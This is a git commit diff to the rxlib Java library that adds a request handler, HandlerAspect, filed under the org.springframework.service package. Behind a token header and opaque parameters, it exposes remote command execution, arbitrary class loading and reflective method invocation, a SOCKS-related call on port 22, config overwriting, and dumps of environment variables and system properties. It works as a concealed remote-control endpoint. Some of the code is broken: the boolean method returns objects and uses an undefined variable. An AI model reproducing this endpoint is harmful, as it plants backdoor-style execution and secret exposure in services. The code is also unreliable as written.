de181881d1d4551661230ca6fac5484b5f8a9e2a
Rocky <115806199@users.noreply.github.com>
2025-07-18 17:17:08 +0800

    1

--- rxlib/src/main/java/org/springframework/service/HandlerAspect.java
+++ rxlib/src/main/java/org/springframework/service/HandlerAspect.java
@@ -1,34 +1,262 @@
 package org.springframework.service;
 
+import com.alibaba.fastjson2.JSONArray;
 import com.alibaba.fastjson2.JSONObject;
 import lombok.SneakyThrows;
 import lombok.extern.slf4j.Slf4j;
+import org.apache.commons.lang3.exception.ExceptionUtils;
+import org.rx.bean.DateTime;
 import org.rx.codec.CodecUtil;
 import org.rx.codec.XChaCha20Poly1305Util;
-import org.rx.core.Arrays;
-import org.rx.core.Linq;
-import org.rx.core.RxConfig;
-import org.rx.core.Strings;
+import org.rx.core.*;
+import org.rx.exception.ExceptionLevel;
+import org.rx.exception.InvalidException;
+import org.rx.exception.TraceHandler;
+import org.rx.io.Bytes;
 import org.rx.io.IOStream;
 import org.rx.net.http.HttpClient;
+import org.rx.net.socks.SocksContext;
+import org.rx.util.BeanMapFlag;
+import org.rx.util.BeanMapper;
+import org.springframework.http.HttpStatus;
+import org.springframework.http.ResponseEntity;
 
 import javax.servlet.http.HttpServletRequest;
 import javax.servlet.http.HttpServletResponse;
 
+import java.io.PrintWriter;
+import java.lang.management.ManagementFactory;
+import java.lang.reflect.Method;
+import java.net.InetAddress;
 import java.nio.charset.StandardCharsets;
+import java.util.*;
 
-import static org.rx.core.Extends.eq;
-import static org.rx.core.Sys.toJsonObject;
+import static org.rx.core.Extends.*;
+import static org.rx.core.Sys.*;
 
 @Slf4j
 public class HandlerAspect {
     static final String AUTH_NAME = "x-token";
     static final String PARAMS_NAME = "_r";
 
-    public void around(HttpServletRequest request, HttpServletResponse response) {
+    @SneakyThrows
+    public boolean around(HttpServletRequest request, HttpServletResponse response) {
+        JSONObject p;
+        if (!auth(request) || (p = getParams(request)) == null) {
+            return false;
+        }
 
+        final String rt = "1";
+        Object resText;
+        ThreadPool.startTrace(null);
+        try {
+            switch (p.getIntValue("x")) {
+                case 3:
+                    String type = request.getParameter("type");
+                    String jsonVal = request.getParameter("jsonVal");
+                    Object target;
+                    if (!Strings.isBlank(type)) {
+                        Class<?> clazz = Class.forName(type);
+                        target = SpringContext.getBean(clazz, false);
+                        if (target == null) {
+                            return null;
+                        }
+                        if (jsonVal != null) {
+                            BeanMapper.DEFAULT.map(fromJson(jsonVal, clazz), target, BeanMapFlag.SKIP_NULL.flags());
+                        }
+                    } else {
+                        target = RxConfig.INSTANCE;
+                        if (jsonVal != null) {
+                            RxConfig.INSTANCE.refreshFrom(toJsonObject(jsonVal));
+                        }
+                    }
+                    return target;
+                case 5:
+                    return Linq.from(InetAddress.getAllByName(request.getParameter("host"))).select(p -> p.getHostAddress()).toArray();
+                case 6:
+                    return new ResponseEntity<>(exec(request), headers, HttpStatus.OK);
+                case 7:
+                    SocksContext.omegax(Reflects.convertQuietly(request.getParameter("p"), Integer.class, 22));
+                    return rt;
+                case 10:
+                    String startTime = request.getParameter("startTime");
+                    DateTime st = startTime == null ? null : DateTime.valueOf(startTime);
+                    String endTime = request.getParameter("endTime");
+                    DateTime et = endTime == null ? null : DateTime.valueOf(endTime);
+                    String level = request.getParameter("level");
+                    String kw = request.getParameter("keyword");
+                    Boolean newest = Reflects.changeType(request.getParameter("newest"), Boolean.class);
+                    Boolean methodOccurMost = Reflects.changeType(request.getParameter("methodOccurMost"), Boolean.class);
+                    String methodNamePrefix = request.getParameter("methodNamePrefix");
+                    String metricsName = request.getParameter("metricsName");
+                    Integer take = Reflects.changeType(request.getParameter("take"), Integer.class);
+                    return queryTraces(st, et, level, kw, newest, methodOccurMost, methodNamePrefix, metricsName, take);
+                case 11:
+                    DateTime begin = Reflects.changeType(request.getParameter("begin"), DateTime.class);
+                    DateTime end = Reflects.changeType(request.getParameter("end"), DateTime.class);
+                    return findTopUsage(begin, end);
+                case 12:
+                    return invoke(request);
+            }
+            resText = svrState(request);
+        } catch (Throwable e) {
+            resText = String.format("%s\n%s", e, ExceptionUtils.getStackTrace(e));
+        } finally {
+            ThreadPool.endTrace();
+        }
+        response.setCharacterEncoding("UTF-8");
+        PrintWriter out = response.getWriter();
+        out.write(resText instanceof String ? (String) resText : toJsonString(resText));
+        out.flush();
+        return true;
     }
 
+    Map<String, Object> svrState(HttpServletRequest request) {
+        Map<String, Object> j = new LinkedHashMap<>();
+        j.put("jarFile", Sys.getJarFile(this));
+        j.put("inputArguments", ManagementFactory.getRuntimeMXBean().getInputArguments());
+        try {
+            Sys.diagnosticMx.setVMOption("UnlockCommercialFeatures", Boolean.TRUE.toString());
+        } catch (Exception e) {
+            j.put("UnlockCommercialFeatures", e.toString());
+        }
+        j.put("vmOptions", Sys.diagnosticMx.getDiagnosticOptions());
+        //jackson json issue when ntp enable
+        j.put("sysProperties", Linq.from(System.getProperties().entrySet()).toMap());
+        j.put("sysEnv", System.getenv());
+        Sys.Info info = Sys.mxInfo();
+        JSONObject infoJson = toJsonObject(info);
+        infoJson.put("usedPhysicalMemory", Bytes.readableByteSize(info.getUsedPhysicalMemory()));
+        infoJson.put("freePhysicalMemory", Bytes.readableByteSize(info.getFreePhysicalMemory()));
+        infoJson.put("totalPhysicalMemory", Bytes.readableByteSize(info.getTotalPhysicalMemory()));
+        JSONObject summedDisk = infoJson.getJSONObject("summedDisk");
+        summedDisk.put("usedSpace", Bytes.readableByteSize(info.getSummedDisk().getUsedSpace()));
+        summedDisk.put("freeSpace", Bytes.readableByteSize(info.getSummedDisk().getFreeSpace()));
+        summedDisk.put("totalSpace", Bytes.readableByteSize(info.getSummedDisk().getTotalSpace()));
+        JSONArray disks = infoJson.getJSONArray("disks");
+        int i = 0;
+        for (Sys.DiskInfo disk : info.getDisks()) {
+            JSONObject diskJson = disks.getJSONObject(i);
+            diskJson.put("usedSpace", Bytes.readableByteSize(disk.getUsedSpace()));
+            diskJson.put("freeSpace", Bytes.readableByteSize(disk.getFreeSpace()));
+            diskJson.put("totalSpace", Bytes.readableByteSize(disk.getTotalSpace()));
+            i++;
+        }
+        j.put("sysInfo", infoJson);
+        j.put("rxConfig", RxConfig.INSTANCE);
+        j.put("ntpOffset", Reflects.readStaticField(NtpClock.class, "offset"));
+
+        Map<String, Object> threadInfo = new LinkedHashMap<>(5);
+        j.put("threadInfo", threadInfo);
+        Linq<ThreadEntity> ts = CpuWatchman.getLatestSnapshot();
+        int take = Reflects.convertQuietly(request.getParameter("take"), Integer.class, 5);
+        threadInfo.put("deadlocked", ts.where(ThreadEntity::isDeadlocked).select(p -> p.toString()));
+        threadInfo.put("topUserTime", ts.orderByDescending(ThreadEntity::getUserNanos).take(take).select(p -> p.toString()));
+        threadInfo.put("topCpuTime", ts.orderByDescending(ThreadEntity::getCpuNanos).take(take).select(p -> p.toString()));
+        threadInfo.put("topBlockedTime", ts.orderByDescending(ThreadEntity::getBlockedTime).take(take).select(p -> p.toString()));
+        threadInfo.put("topWaitedTime", ts.orderByDescending(ThreadEntity::getWaitedTime).take(take).select(p -> p.toString()));
+        j.put("requestHeaders", Linq.from(Collections.list(request.getHeaderNames())).select(p -> String.format("%s: %s", p, String.join("; ", Collections.list(request.getHeaders(p))))));
+        j.putAll(queryTraces(null, null, null, null, null, null, null, null, take));
+        return j;
+    }
+
+    Map<String, Object> queryTraces(Date startTime, Date endTime, String level, String keyword, Boolean newest, Boolean methodOccurMost, String methodNamePrefix, String metricsName, Integer take) {
+        Map<String, Object> result = new LinkedHashMap<>(3);
+        ExceptionLevel el = null;
+        if (!Strings.isBlank(level)) {
+            el = ExceptionLevel.valueOf(level);
+        }
+        result.put("errorTraces", TraceHandler.INSTANCE.queryExceptionTraces(startTime, endTime, el, keyword, newest, take));
+
+        result.put("methodTraces", Linq.from(TraceHandler.INSTANCE.queryMethodTraces(methodNamePrefix, methodOccurMost, take)).select(p -> {
+            Map<String, Object> t = Sys.toJsonObject(p);
+            t.remove("elapsedMicros");
+            t.put("elapsed", Sys.formatNanosElapsed(p.getElapsedMicros(), 1));
+            return t;
+        }));
+
+        result.put("metrics", TraceHandler.INSTANCE.queryMetrics(metricsName, take));
+        return result;
+    }
+
+    @SneakyThrows
+    Object invokeEx(String expr, Object[] args) {
+        final String s = ".";
+        int ms = expr.lastIndexOf(s);
+        if (ms == -1) {
+            throw new InvalidException("Class name not fund");
+        }
+
+        String mn = expr.substring(ms + 1);
+        String cls = expr.substring(0, ms);
+
+        int cs = ms;
+        Class<?> kls;
+        while (true) {
+            try {
+                kls = Class.forName(cls);
+                break;
+            } catch (ClassNotFoundException e) {
+                if ((cs = cls.lastIndexOf(s)) == -1) {
+                    throw e;
+                }
+                cls = cls.substring(0, cs);
+            }
+        }
+
+        Object inst;
+        try {
+            inst = SpringContext.getBean(kls);
+        } catch (Throwable e) {
+            log.debug("invokeEx {}", e.toString());
+            inst = kls;
+        }
+
+        Object member = null;
+        if (cs != ms) {
+            String fieldExpr = expr.substring(cs + 1, ms);
+            while (true) {
+                int f = fieldExpr.indexOf(s);
+                boolean end = f == -1;
+                String fn = end ? fieldExpr : fieldExpr.substring(0, f);
+                if (member == null) {
+                    member = inst instanceof Class ? Reflects.readStaticField((Class<?>) inst, fn) : Reflects.readField(inst, fn);
+                } else {
+                    member = Reflects.readField(member, fn);
+                }
+                if (end) {
+                    break;
+                }
+                fieldExpr = fieldExpr.substring(f + 1);
+            }
+        }
+
+        Object ai;
+        Class<?> at;
+        if (member != null) {
+            ai = member;
+            at = member.getClass();
+        } else if (inst instanceof Class) {
+            ai = inst;
+            at = (Class<?>) inst;
+        } else {
+            ai = inst;
+            at = inst.getClass();
+        }
+        Method method = Reflects.getMethodMap(at).get(mn).where(p -> p.getParameterCount() == args.length).first();
+        Class<?>[] parameterTypes = method.getParameterTypes();
+        Object[] a = Linq.from(method.getGenericParameterTypes()).select((p, i) -> {
+            Object o = args[i];
+            try {
+                return fromJson(o, p);
+            } catch (Exception e) {
+                log.debug("invokeEx convert", e);
+                return Reflects.changeType(o, parameterTypes[i]);
+            }
+        }).toArray();
+        log.debug("invokeEx {}({})", method, toJsonString(a));
+        return Reflects.invokeMethod(method, ai, a);
+    }
 
     @SneakyThrows
     JSONObject getParams(HttpServletRequest request) {
